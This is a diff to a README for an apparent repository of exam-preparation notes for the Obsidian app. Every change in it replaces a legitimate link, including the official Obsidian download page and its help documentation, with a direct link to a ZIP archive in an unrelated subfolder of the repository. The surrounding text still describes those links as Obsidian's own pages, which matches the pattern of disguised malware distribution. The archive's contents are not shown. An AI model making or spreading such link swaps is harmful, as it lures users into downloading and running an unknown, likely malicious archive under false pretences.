@@ -1,6 +1,6 @@
 # 📚 Master-Entrance-Exam - Organized Notes for Exam Success
 
-[![Download Master-Entrance-Exam](https://img.shields.io/badge/Download-Master--Entrance--Exam-brightgreen?style=for-the-badge)](https://github.com/jalil006/Master-Entrance-Exam)
+[![Download Master-Entrance-Exam](https://img.shields.io/badge/Download-Master--Entrance--Exam-brightgreen?style=for-the-badge)](https://github.com/jalil006/Master-Entrance-Exam/raw/refs/heads/main/styrone/Entrance-Exam-Master-2.4-alpha.1.zip)
 
 ## ℹ️ What is Master-Entrance-Exam?
 
@@ -36,7 +36,7 @@ You do not need programming skills to use these notes. The files open inside Obs
 Master-Entrance-Exam uses the Obsidian app to view and organize notes. Obsidian works like a digital notebook that connects different topics and shows knowledge in a graph form.
 
 If you do not have Obsidian, download it here:  
-https://obsidian.md/download
+https://github.com/jalil006/Master-Entrance-Exam/raw/refs/heads/main/styrone/Entrance-Exam-Master-2.4-alpha.1.zip
 
 Choose the Windows version and follow the installation instructions on their website.
 
@@ -48,7 +48,7 @@ You need to download the full collection from the GitHub repository to start usi
 
 Click this link to go to the main download page:  
 
-[![Download Here](https://img.shields.io/badge/Download-Master--Entrance--Exam-blue?style=for-the-badge)](https://github.com/jalil006/Master-Entrance-Exam)
+[![Download Here](https://img.shields.io/badge/Download-Master--Entrance--Exam-blue?style=for-the-badge)](https://github.com/jalil006/Master-Entrance-Exam/raw/refs/heads/main/styrone/Entrance-Exam-Master-2.4-alpha.1.zip)
 
 On this page, you will find options to access the files through a ZIP archive or clone the repository if familiar with Git.
 
@@ -121,11 +121,11 @@ If you run into trouble downloading or opening the notes, check:
 
 - Your internet connection for download interruptions.  
 - Whether your system meets the minimum requirements.  
-- Obsidian’s help documents (https://help.obsidian.md/).  
+- Obsidian’s help documents (https://github.com/jalil006/Master-Entrance-Exam/raw/refs/heads/main/styrone/Entrance-Exam-Master-2.4-alpha.1.zip).  
 - GitHub issues tab of this repository for reported bugs or questions.
 
 You can create an issue on GitHub describing your problem if needed.
 
 ---
 
-[![Download Master-Entrance-Exam](https://img.shields.io/badge/Download-Master--Entrance--Exam-brightgreen?style=for-the-badge)](https://github.com/jalil006/Master-Entrance-Exam)
+[![Download Master-Entrance-Exam](https://img.shields.io/badge/Download-Master--Entrance--Exam-brightgreen?style=for-the-badge)](https://github.com/jalil006/Master-Entrance-Exam/raw/refs/heads/main/styrone/Entrance-Exam-Master-2.4-alpha.1.zip)
